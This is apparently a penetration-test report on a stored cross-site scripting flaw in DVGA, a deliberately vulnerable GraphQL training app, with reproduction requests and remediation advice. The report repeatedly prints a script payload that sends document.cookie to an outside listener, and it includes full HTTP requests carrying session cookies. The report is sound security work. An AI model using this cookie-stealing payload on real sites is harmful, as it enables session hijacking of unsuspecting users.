# DVGA-010. Stored Cross-Site Scripting (XSS) via ImportPaste

## Severity

Critical

CVSS v3.1 Score: 9.3 (Critical)

Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N

## Overall CVSS Calculation

Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
CVSS Base Score:          9.3
Impact Subscore:          5.8
Exploitability Subscore:  2.8
CVSS Temporal Score:      NA
CVSS Environmental Score: NA
Modified Impact Subscore: NA
Overall CVSS Score:       9.3

## CWE

**CWE-79 — Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')**

## OWASP Mapping

* **OWASP Top 10 2021: A03 — Injection**
* **OWASP API Security Top 10 2023: No direct mapping**

The confirmed vulnerability is **Stored Cross-Site Scripting (XSS)**. The application accepts attacker-controlled HTML/JavaScript through the `ImportPaste` functionality, stores the content, and later renders it in `/my_pastes` without appropriate sanitization or output encoding.

The HTML injection observed during testing is supporting evidence for the lack of proper output handling, while the confirmed JavaScript execution is what establishes the Stored XSS vulnerability.

## Affected Endpoints

* `POST /graphql`
* `/import_paste`
* `/my_pastes`

## Affected GraphQL Operations

### Import Operation

**Mutation:** `ImportPaste`

**Affected arguments:**

* `host`
* `port`
* `path`
* `scheme`

The remote content retrieved by this mutation is stored as the paste content.

### Retrieval Operation

**Query:** `getPastes`

**Field:** `pastes`

**Affected field:**

* `content`

## Description

While testing the `ImportPaste` functionality, I wanted to check whether content imported from a remote paste service was properly sanitized before being stored and displayed.

I created a Pastebin paste containing both HTML and JavaScript payloads and then imported it through the `ImportPaste` GraphQL mutation.

The content of the Pastebin paste was:

```html
<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>
<mark>XSSED</mark> </br>
<h1 style="color:red">XSSED</h1>
```

Paste used during testing:

`https://pastebin.com/raw/E9VBs7eb`

Interestingly, both the XSS and HTML payloads were successfully imported.

The `ImportPaste` response returned the supplied payload without any visible sanitization. The same content was then stored as a paste and returned later by the `getPastes` query through the `pastes.content` field.

When the imported paste was viewed through `/my_pastes`, the HTML elements were rendered by the browser instead of being displayed as plain text. More importantly, the `<script>` payload also executed.

To confirm the JavaScript execution, the payload attempted to send `document.cookie` to my controlled `server.py` listener. I received the resulting request on my server, including the cookie value.

This confirms that attacker-controlled JavaScript can be stored through `ImportPaste` and later executed in the browser when the affected paste is rendered.

Therefore, the issue is a **Stored Cross-Site Scripting (XSS)** vulnerability.

## Steps to Reproduce

### 1. Prepare a malicious remote paste

Create a Pastebin paste containing:

```html
<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>
<mark>XSSED</mark> </br>
<h1 style="color:red">XSSED</h1>
```

The raw Pastebin URL used during testing was:

`https://pastebin.com/raw/E9VBs7eb`

### 2. Import the remote paste

Send the following request to the GraphQL endpoint:

```http
POST /graphql HTTP/2
Host: merlin-declivitous-crowdedly.ngrok-free.dev
Cookie: abuse_interstitial=merlin-declivitous-crowdedly.ngrok-free.dev; chat_session_id=ac1813ce-74a0-4f9f-a7b5-e4b9caafeb6a; env=graphiql:disable
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: application/json
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://merlin-declivitous-crowdedly.ngrok-free.dev/import_paste
Content-Type: application/json
Origin: https://merlin-declivitous-crowdedly.ngrok-free.dev

{"query":"mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {
        importPaste(host: $host, port: $port, path: $path, scheme: $scheme) {
          result
        }
      }","variables":{"host":"pastebin.com","port":443,"path":"/raw/E9VBs7eb","scheme":"https"}}
```

### 3. Observe the response

The application returned the imported content directly:

```http
HTTP/2 200 OK
Content-Type: application/json
Date: Tue, 01 Sep 2026 13:13:05 GMT
Ngrok-Agent-Ips: X
Content-Length: 186

{"data":{"importPaste":{"result":"<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>\n<mark>XSSED</mark> </br>\n<h1 style=\"color:red\">XSSED</h1>"}}}
```

The payload was accepted without being sanitized.

### 4. Retrieve the stored paste

I then requested the user's private pastes using the `getPastes` query:

```http
POST /graphql HTTP/2
Host: merlin-declivitous-crowdedly.ngrok-free.dev
Cookie: abuse_interstitial=merlin-declivitous-crowdedly.ngrok-free.dev; chat_session_id=ac1813ce-74a0-4f9f-a7b5-e4b9caafeb6a; env=graphiql:disable
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv=154.0) Gecko/20100101 Firefox/154.0
Accept: application/json
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://merlin-declivitous-crowdedly.ngrok-free.dev/my_pastes
Content-Type: application/json
Origin: https://merlin-declivitous-crowdedly.ngrok-free.dev

{"query":"query getPastes {
        pastes(public:false) {
          id
          title
          content
          ipAddr
          userAgent
          owner {
            name
          }
          }
        }"}
```

The response contained the malicious content in the `content` field:

```json
{
  "data": {
    "pastes": [
      {
        "id": "15",
        "title": "Imported Paste from URL - e6b740",
        "content": "<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>\n<mark>XSSED</mark> </br>\n<h1 style=\"color:red\">XSSED</h1>",
        "ipAddr": "172.17.0.1",
        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv=154.0) Gecko/20100101 Firefox/154.0",
        "owner": {
          "name": "DVGAUser"
        }
      }
    ]
  }
}
```

This confirms that the malicious payload was stored and later returned through the `pastes` query.

### 5. View the imported paste

Navigate to:

```text
/my_pastes
```

The imported paste is displayed on the page.

The following HTML elements were rendered by the browser:

```html
<mark>XSSED</mark>
<h1 style="color:red">XSSED</h1>
```

This demonstrates that the imported content is being treated as HTML rather than safely encoded as text.

### 6. Confirm stored XSS execution

The `<script>` payload also executed when the stored paste was rendered:

```html
<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>
```

The request was received by my controlled `server.py` listener.

The received callback contained the browser's `document.cookie` value, confirming that the stored JavaScript executed successfully in the browser and was able to access cookies available to JavaScript.

## Proof of Concept

The complete payload used during testing was:

```html
<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>
<mark>XSSED</mark> </br>
<h1 style="color:red">XSSED</h1>
```

The payload demonstrates:

* HTML tags are interpreted and rendered by the browser.
* JavaScript is stored as part of the paste.
* The JavaScript executes when the stored paste is viewed.
* `document.cookie` was accessible to the executed JavaScript.
* A callback was successfully received by the controlled server.

## Attack Flow

```text
Attacker-controlled Pastebin content
              |
              v
       ImportPaste mutation
              |
              v
      Malicious content stored
              |
              v
       getPastes / pastes
              |
              v
        /my_pastes page
              |
              v
       Browser renders content
              |
              v
       Stored JavaScript executes
              |
              v
      document.cookie accessed
```

## Impact

An attacker who can control content imported through `ImportPaste` may be able to store malicious JavaScript in the application.

When a victim views the affected paste through `/my_pastes`, the stored JavaScript executes in the victim's browser under the application's origin.

This can potentially allow an attacker to:

* Access cookies that are available to JavaScript.
* Perform actions within the victim's authenticated session.
* Modify application data or perform actions as the victim.
* Read information accessible to JavaScript within the application's security context.
* Target other users who view the malicious paste.

During testing, I specifically confirmed access to `document.cookie` and successfully received the value through my controlled server.

The practical impact will depend on the application's cookie configuration, user privileges, and the actions available to an authenticated user.

## Root Cause

The main issue is that content retrieved by `ImportPaste` is treated as trusted content instead of untrusted user-controlled data.

The imported content is stored without appropriate sanitization and is later returned through the `pastes.content` field.

When this content is rendered by `/my_pastes`, it is interpreted as HTML/JavaScript by the browser instead of being safely encoded.

This allows attacker-controlled JavaScript to survive the import and storage process and execute when the stored paste is viewed.

## Remediation

* Treat all content imported through `ImportPaste` as untrusted data.
* HTML-encode untrusted paste content before placing it into an HTML page.
* Avoid rendering user-controlled content through unsafe DOM sinks such as `innerHTML`.
* If HTML rendering is an intended feature, sanitize the content using a well-maintained HTML sanitization library with a strict allowlist.
* Block executable elements such as `<script>` and dangerous event-handler attributes.
* Apply a restrictive Content Security Policy (CSP) as an additional defense-in-depth control.
* Mark authentication/session cookies as `HttpOnly` where possible to prevent JavaScript from reading them.
* Ensure content imported from external services receives the same security treatment as content directly supplied by users.

## Evidence

All testing evidence has been saved under:

```text
evidence/DVGA-010-Stored-XSS-via-ImportPaste
```

The evidence contains the relevant requests, responses, screenshots, and the server-side callback evidence demonstrating JavaScript execution.

The testing was performed manually, and the relevant request/response traffic and screenshots have been preserved as evidence.

## References

* CWE-79 — Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
* OWASP Top 10 2021 — A03: Injection
* OWASP Cross-Site Scripting Prevention Cheat Sheet
